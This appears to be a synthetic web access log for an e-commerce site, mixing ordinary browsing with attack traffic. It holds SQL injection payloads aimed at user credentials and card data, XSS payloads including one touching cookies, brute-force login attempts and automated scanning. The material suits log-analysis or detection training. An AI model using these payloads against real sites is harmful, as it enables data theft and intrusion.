198.51.100.42 - - [15/Jun/2025:00:27:57 +0000] "GET /api/products?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 400 312 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:00:00 +0000] "POST /api/login HTTP/1.1" 401 219 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.36 - - [15/Jun/2025:00:57:55 +0000] "GET /about HTTP/1.1" 304 3221 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.43 - - [15/Jun/2025:00:57:54 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 3094 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.22 - - [15/Jun/2025:00:35:04 +0000] "GET /api/cart/add HTTP/1.1" 200 7941 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.31 - - [15/Jun/2025:00:57:37 +0000] "POST /static/js/app.js HTTP/1.1" 201 3390 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:22:29 +0000] "GET /api/products?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 400 453 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.39 - - [15/Jun/2025:00:42:14 +0000] "POST /index.html HTTP/1.1" 201 4565 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.17 - - [15/Jun/2025:00:47:39 +0000] "POST /robots.txt HTTP/1.1" 201 5349 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.45 - - [15/Jun/2025:00:59:22 +0000] "GET / HTTP/1.1" 404 3119 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.14 - - [15/Jun/2025:00:37:35 +0000] "GET /static/css/main.css HTTP/1.1" 200 4549 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.15 - - [15/Jun/2025:00:30:46 +0000] "POST /products HTTP/1.1" 200 3563 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.37 - - [15/Jun/2025:00:29:17 +0000] "POST /about HTTP/1.1" 200 3327 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.43 - - [15/Jun/2025:00:56:12 +0000] "GET / HTTP/1.1" 304 3791 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.43 - - [15/Jun/2025:00:30:14 +0000] "GET /about HTTP/1.1" 200 5263 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:28:57 +0000] "GET /static/js/app.js HTTP/1.1" 200 3144 "-" "curl/8.5.0"
192.168.1.11 - - [15/Jun/2025:00:38:45 +0000] "GET /cart HTTP/1.1" 200 767 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.42 - - [15/Jun/2025:00:10:44 +0000] "POST /api/login HTTP/1.1" 401 190 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.99 - - [15/Jun/2025:00:26:58 +0000] "GET /api/search?term=1; DROP TABLE users-- HTTP/1.1" 400 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.23 - - [15/Jun/2025:00:29:34 +0000] "POST /contact HTTP/1.1" 200 2203 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.42 - - [15/Jun/2025:00:16:19 +0000] "POST /api/login HTTP/1.1" 401 205 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.14 - - [15/Jun/2025:00:54:37 +0000] "GET /static/js/app.js HTTP/1.1" 404 4286 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.55 - - [15/Jun/2025:00:14:59 +0000] "POST /api/login HTTP/1.1" 401 190 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [15/Jun/2025:00:33:55 +0000] "GET /robots.txt HTTP/1.1" 200 6110 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.77 - - [15/Jun/2025:00:23:19 +0000] "GET /api/orders?id=1 OR 1=1-- HTTP/1.1" 400 440 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.41 - - [15/Jun/2025:00:49:15 +0000] "GET /products HTTP/1.1" 200 2747 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.17 - - [15/Jun/2025:00:32:18 +0000] "GET / HTTP/1.1" 200 1756 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.16 - - [15/Jun/2025:01:00:09 +0000] "GET /api/user/profile HTTP/1.1" 304 2375 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [15/Jun/2025:00:50:20 +0000] "GET /contact HTTP/1.1" 404 562 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.77 - - [15/Jun/2025:00:05:30 +0000] "POST /api/login HTTP/1.1" 401 182 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.34 - - [15/Jun/2025:00:34:03 +0000] "GET /api/cart/add HTTP/1.1" 200 7401 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.30 - - [15/Jun/2025:00:52:28 +0000] "POST /api/cart/add HTTP/1.1" 200 3831 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.48 - - [15/Jun/2025:00:51:19 +0000] "POST /search?q=laptop HTTP/1.1" 201 7840 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.18 - - [15/Jun/2025:00:56:54 +0000] "GET /api/orders HTTP/1.1" 200 6463 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:45 +0000] "GET /static/js/app.js HTTP/1.1" 200 1073 "-" "Go-http-client/1.1"
192.168.1.21 - - [15/Jun/2025:00:45:14 +0000] "GET /products HTTP/1.1" 404 457 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.77 - - [15/Jun/2025:00:27:52 +0000] "GET /api/review?text=<body onload=eval(atob('YWxlcnQoMSk='))> HTTP/1.1" 400 476 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:28:59 +0000] "GET / HTTP/1.1" 200 2081 "-" "python-requests/2.31.0"
192.168.1.18 - - [15/Jun/2025:00:31:17 +0000] "GET /images/banner.jpg HTTP/1.1" 304 2032 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.10 - - [15/Jun/2025:00:36:33 +0000] "GET /api/orders HTTP/1.1" 304 7109 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.23 - - [15/Jun/2025:00:37:29 +0000] "GET /contact HTTP/1.1" 200 6517 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.11 - - [15/Jun/2025:00:46:55 +0000] "GET /api/user/profile HTTP/1.1" 200 4623 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.36 - - [15/Jun/2025:00:53:21 +0000] "GET /contact HTTP/1.1" 200 7831 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:28:12 +0000] "GET /images/banner.jpg HTTP/1.1" 200 2783 "-" "Go-http-client/1.1"
192.168.1.47 - - [15/Jun/2025:00:42:05 +0000] "GET /products HTTP/1.1" 200 4237 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.99 - - [15/Jun/2025:00:02:26 +0000] "POST /api/login HTTP/1.1" 401 196 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.45 - - [15/Jun/2025:00:58:41 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 2791 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.21 - - [15/Jun/2025:00:56:58 +0000] "POST /static/css/main.css HTTP/1.1" 200 278 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [15/Jun/2025:00:36:13 +0000] "GET /checkout HTTP/1.1" 304 6367 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.48 - - [15/Jun/2025:00:52:38 +0000] "GET / HTTP/1.1" 200 6653 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [15/Jun/2025:00:45:16 +0000] "POST /index.html HTTP/1.1" 200 4069 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.42 - - [15/Jun/2025:00:01:09 +0000] "POST /api/login HTTP/1.1" 401 182 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.34 - - [15/Jun/2025:00:50:14 +0000] "POST /api/user/profile HTTP/1.1" 200 1746 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.42 - - [15/Jun/2025:00:11:01 +0000] "POST /api/login HTTP/1.1" 401 205 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.42 - - [15/Jun/2025:00:49:32 +0000] "POST /products HTTP/1.1" 201 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.47 - - [15/Jun/2025:00:55:28 +0000] "GET /search?q=laptop HTTP/1.1" 304 4990 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.43 - - [15/Jun/2025:00:45:42 +0000] "GET /static/js/app.js HTTP/1.1" 404 1552 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
172.16.0.55 - - [15/Jun/2025:00:10:14 +0000] "POST /api/login HTTP/1.1" 401 198 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:28 +0000] "GET /contact HTTP/1.1" 429 2126 "-" "libwww-perl/6.72"
172.16.0.55 - - [15/Jun/2025:00:25:33 +0000] "GET /products?name=<img src=x onerror=alert(document.domain)> HTTP/1.1" 400 490 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [15/Jun/2025:00:41:32 +0000] "POST /static/css/main.css HTTP/1.1" 200 5273 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
198.51.100.42 - - [15/Jun/2025:00:04:04 +0000] "POST /api/login HTTP/1.1" 401 225 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.77 - - [15/Jun/2025:00:08:30 +0000] "POST /api/login HTTP/1.1" 401 239 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.55 - - [15/Jun/2025:00:25:47 +0000] "GET /products?category=1' UNION SELECT credit_card,cvv,expiry FROM payments-- HTTP/1.1" 400 498 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.41 - - [15/Jun/2025:00:29:39 +0000] "POST /api/products?category=clothing HTTP/1.1" 200 2307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:41 +0000] "GET /api/user/profile HTTP/1.1" 200 1320 "-" "Go-http-client/1.1"
192.168.1.30 - - [15/Jun/2025:00:56:45 +0000] "GET /index.html HTTP/1.1" 200 933 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.37 - - [15/Jun/2025:00:41:26 +0000] "POST /robots.txt HTTP/1.1" 200 4092 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.19 - - [15/Jun/2025:00:36:26 +0000] "POST /checkout HTTP/1.1" 200 6138 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.22 - - [15/Jun/2025:00:53:46 +0000] "GET /about HTTP/1.1" 200 4306 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.29 - - [15/Jun/2025:00:59:46 +0000] "GET /index.html HTTP/1.1" 404 3370 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.42 - - [15/Jun/2025:00:21:21 +0000] "GET /products?category=1' UNION SELECT credit_card,cvv,expiry FROM payments-- HTTP/1.1" 400 387 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.12 - - [15/Jun/2025:00:37:38 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 557 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:28:35 +0000] "GET /search?q=laptop HTTP/1.1" 200 1051 "-" "Wget/1.21.4"
192.168.1.42 - - [15/Jun/2025:00:53:30 +0000] "GET /api/cart/add HTTP/1.1" 304 2614 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:23 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 2918 "-" "Wget/1.21.4"
203.0.113.77 - - [15/Jun/2025:00:21:59 +0000] "GET /api/user?id=1 UNION SELECT 1,2,3-- HTTP/1.1" 400 476 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.19 - - [15/Jun/2025:00:42:07 +0000] "GET /api/cart/add HTTP/1.1" 200 2993 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.14 - - [15/Jun/2025:00:58:36 +0000] "GET /api/cart/add HTTP/1.1" 200 2880 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:17:48 +0000] "POST /api/login HTTP/1.1" 401 232 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.36 - - [15/Jun/2025:00:30:12 +0000] "GET /cart HTTP/1.1" 304 6410 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.23 - - [15/Jun/2025:00:57:21 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 1510 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.16 - - [15/Jun/2025:00:54:09 +0000] "GET /index.html HTTP/1.1" 404 3557 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.36 - - [15/Jun/2025:00:38:52 +0000] "GET /robots.txt HTTP/1.1" 200 7819 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
172.16.0.55 - - [15/Jun/2025:00:00:06 +0000] "POST /api/login HTTP/1.1" 401 230 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [15/Jun/2025:00:45:26 +0000] "POST /cart HTTP/1.1" 201 7238 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.47 - - [15/Jun/2025:00:31:05 +0000] "POST /checkout HTTP/1.1" 200 1005 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.25 - - [15/Jun/2025:00:52:13 +0000] "POST /favicon.ico HTTP/1.1" 200 6165 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.44 - - [15/Jun/2025:00:31:33 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 1249 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.23 - - [15/Jun/2025:00:54:55 +0000] "GET / HTTP/1.1" 200 4506 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.42 - - [15/Jun/2025:00:40:43 +0000] "GET / HTTP/1.1" 200 7261 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.12 - - [15/Jun/2025:00:31:13 +0000] "POST /static/js/app.js HTTP/1.1" 200 5883 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:28:26 +0000] "GET /images/banner.jpg HTTP/1.1" 200 1718 "-" "Go-http-client/1.1"
198.51.100.42 - - [15/Jun/2025:00:28:02 +0000] "GET /search?q=<script>document.cookie='stolen='+document.cookie</script> HTTP/1.1" 400 352 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.42 - - [15/Jun/2025:00:02:50 +0000] "POST /api/login HTTP/1.1" 401 206 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.44 - - [15/Jun/2025:00:36:46 +0000] "GET /index.html HTTP/1.1" 200 860 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.55 - - [15/Jun/2025:00:09:32 +0000] "POST /api/login HTTP/1.1" 401 195 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.43 - - [15/Jun/2025:00:51:51 +0000] "GET /products HTTP/1.1" 404 5018 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.41 - - [15/Jun/2025:00:38:37 +0000] "GET /cart HTTP/1.1" 304 1465 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:28:50 +0000] "GET /robots.txt HTTP/1.1" 429 3188 "-" "curl/8.5.0"
192.168.1.16 - - [15/Jun/2025:00:44:59 +0000] "GET /robots.txt HTTP/1.1" 200 2076 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:36 +0000] "GET /static/css/main.css HTTP/1.1" 429 1252 "-" "Wget/1.21.4"
192.168.1.47 - - [15/Jun/2025:00:40:09 +0000] "GET /api/orders HTTP/1.1" 200 465 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.32 - - [15/Jun/2025:00:57:42 +0000] "POST /robots.txt HTTP/1.1" 201 6200 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.37 - - [15/Jun/2025:00:32:07 +0000] "GET /static/css/main.css HTTP/1.1" 404 7513 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.48 - - [15/Jun/2025:00:38:23 +0000] "GET /robots.txt HTTP/1.1" 200 5585 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.14 - - [15/Jun/2025:00:50:35 +0000] "GET /images/banner.jpg HTTP/1.1" 404 4034 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.42 - - [15/Jun/2025:00:12:24 +0000] "POST /api/login HTTP/1.1" 401 222 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.42 - - [15/Jun/2025:00:48:19 +0000] "POST /static/js/app.js HTTP/1.1" 201 4471 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.33 - - [15/Jun/2025:00:56:19 +0000] "GET /contact HTTP/1.1" 304 5591 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.36 - - [15/Jun/2025:00:36:00 +0000] "POST /about HTTP/1.1" 200 5798 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.17 - - [15/Jun/2025:00:51:04 +0000] "GET /cart HTTP/1.1" 200 3970 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.13 - - [15/Jun/2025:00:33:15 +0000] "GET /favicon.ico HTTP/1.1" 200 1058 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
